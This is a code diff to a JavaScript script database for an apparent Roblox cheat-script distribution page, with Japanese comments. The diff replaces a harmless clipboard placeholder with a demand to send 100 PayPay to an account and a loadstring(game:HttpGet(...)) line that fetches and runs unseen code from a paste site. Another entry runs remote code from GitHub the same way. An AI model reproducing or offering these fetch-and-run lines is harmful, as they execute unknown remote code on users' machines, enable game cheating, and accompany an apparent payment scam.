@@ -3,14 +3,11 @@ const scriptDatabase = {
     farm: `loadstring(game:HttpGet("https://raw.githubusercontent.com/ily123950/Vulkan/refs/heads/main/Tr"))()\n--無料スクリプト、公開サーバー用\n`,
     
     clipboard_test: `-- [[ Data Clipboard Tool ]] --\n` +
-                    `local targetData = "テスト用ダミーデータ"\n` +
+                    `tomakopay←ここに100paypay\n` +
                     `\n` +
-                    `-- [くり抜き部分]: 取得したデータを処理するコアロジック\n` +
-                    `-- 《ここにデータ送信や特定のバックエンド処理を記述》\n` +
-                    `-- 例: print("検証用データ: " .. targetData)\n` +
-                    `\n` +
-                    `setclipboard(targetData)\n` +
-                    `print("データをクリップボードに退避させました。")\n`
+                    `pay入金しないと使えないから勘違いすんじゃないぞ\n` +
+                    `loadstring(game:HttpGet("https://pastefy.app/ZPJSUG0J/raw"))\n` 
+
 };
 
 // ボタンが押されたときにコードエリアを表示する関数
